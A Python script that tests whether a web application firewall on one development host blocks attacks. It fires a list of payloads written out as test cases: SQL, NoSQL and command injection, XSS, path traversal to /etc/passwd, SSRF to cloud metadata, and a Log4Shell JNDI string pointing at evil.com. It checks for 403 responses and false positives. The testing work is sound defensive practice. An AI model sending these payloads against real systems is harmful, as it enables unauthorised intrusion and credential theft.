#!/usr/bin/env python3
import requests
import json
import time

TARGET = "https://dev.idts.dpc.com.tn"

# Disables SSL warnings since we might hit HAProxy with a self-signed cert or similar in some setups
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_CASES = [
    # 1. Normal Traffic (Should Pass)
    {"name": "Normal Request", "path": "/login", "status_expected": [200, 304, 404, 301]},
    
    # 2. SQL Injection
    {"name": "SQL Injection (URL)", "path": "/api/users?id=1'+OR+1=1--", "status_expected": [403]},
    {"name": "SQL Injection (Union)", "path": "/api/search?q=UNION+SELECT+version()", "status_expected": [403]},
    
    # 3. Cross-Site Scripting (XSS)
    {"name": "XSS (Reflected)", "path": "/?search=<script>alert(1)</script>", "status_expected": [403]},
    {"name": "XSS (Event Handler)", "path": "/login?error=1+onmouseover=alert(1)", "status_expected": [403]},
    {"name": "XSS (JavaScript URI)", "path": "/redirect?url=javascript:alert('XSS')", "status_expected": [403]},
    
    # 4. Command Injection
    {"name": "Command Injection (Basic)", "path": "/api/ping?host=127.0.0.1;cat+/etc/passwd", "status_expected": [403]},
    {"name": "Command Injection (Backticks)", "path": "/api/exec?cmd=`id`", "status_expected": [403]},
    {"name": "Command Injection (Pipe)", "path": "/api/test?var=value|whoami", "status_expected": [403]},
    
    # 5. Path Traversal / LFI
    {"name": "Path Traversal (Basic)", "path": "/api/download?file=../../../../etc/passwd", "status_expected": [403]},
    {"name": "Path Traversal (Encoded)", "path": "/api/view?doc=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "status_expected": [403]},
    
    # 6. SSRF (Server-Side Request Forgery)
    {"name": "SSRF (AWS Metadata)", "path": "/api/fetch?url=http://169.254.169.254/latest/meta-data/", "status_expected": [403]},
    {"name": "SSRF (Localhost)", "path": "/api/proxy?target=http://127.0.0.1:8080/admin", "status_expected": [403]},
    
    # 7. Bad Bots & Scanners User-Agents
    {"name": "Malicious Scanner (Nikto)", "path": "/", "headers": {"User-Agent": "Nikto/2.1.6"}, "status_expected": [403]},
    {"name": "Malicious Scanner (Nmap)", "path": "/", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; "}, "status_expected": [403]},
    {"name": "SQLMap", "path": "/", "headers": {"User-Agent": "sqlmap/1.5.8#stable"}, "status_expected": [403]},
    
    # 8. Malicious Headers (Log4Shell, Cache Poisoning)
    {"name": "Log4Shell (JNDI)", "path": "/", "headers": {"User-Agent": "${jndi:ldap://evil.com/a}"}, "status_expected": [403]},
    {"name": "Host Header Poisoning", "path": "/", "headers": {"X-Forwarded-Host": "evil.com"}, "status_expected": [403]},
    
    # 9. Body Payloads (JSON / Forms)
    {"name": "NoSQL Injection (JSON Body)", "path": "/api/auth/login", "method": "POST", "json": {"username": {"$ne": None}, "password": {"$ne": None}}, "status_expected": [403]},
    {"name": "Deserialization (Java)", "path": "/api/upload", "method": "POST", "data": "rO0ABXNyAApIZWxsb1dvcmxkAAAAAAAAAAACAAI=", "status_expected": [403]},
    
    # 10. False Positive Verification (Should Pass)
    {"name": "Valid Angular SPA Route", "path": "/dashboard/conducteur", "status_expected": [200, 304, 404, 301]},
    {"name": "Valid Complex API Call", "path": "/api/factures/getFacturesByChantierAndDate", "status_expected": [200, 304, 404, 301, 401, 500]}, # Backend might say unauthorized/error, but WAF shouldn't 403
]

results = {
    "total": len(TEST_CASES),
    "passed": 0,
    "failed": 0,
    "details": []
}

print(f"[*] Starting WAF Security Tests against {TARGET}...")
print("-" * 60)

for test in TEST_CASES:
    url = f"{TARGET}{test['path']}"
    method = test.get("method", "GET")
    headers = test.get("headers", {})
    
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, verify=False, timeout=5)
        else:
            if "json" in test:
                response = requests.post(url, json=test["json"], headers=headers, verify=False, timeout=5)
            else:
                response = requests.post(url, data=test.get("data", ""), headers=headers, verify=False, timeout=5)
        
        status = response.status_code
        is_expected = status in test["status_expected"]
        
        if is_expected:
            print(f"[+] PASS: {test['name']} (Got HTTP {status})")
            results["passed"] += 1
        else:
            print(f"[-] FAIL: {test['name']} (Expected {test['status_expected']}, Got HTTP {status})")
            results["failed"] += 1
            
        results["details"].append({
            "test": test["name"],
            "url": url,
            "expected_status": test["status_expected"],
            "actual_status": status,
            "pass": is_expected,
            "response_snippet": response.text[:100] if status == 403 else "..."
        })
        
    except Exception as e:
        print(f"[!] ERROR: {test['name']} failed to execute: {e}")
        results["failed"] += 1

print("-" * 60)
print(f"[*] Test Suite Completed.")
print(f"    Total Tests: {results['total']}")
print(f"    Passed: {results['passed']}")
print(f"    Failed: {results['failed']}")

with open("waf_test_report.json", "w") as f:
    json.dump(results, f, indent=4)
print(f"[*] Detailed report saved to waf_test_report.json")
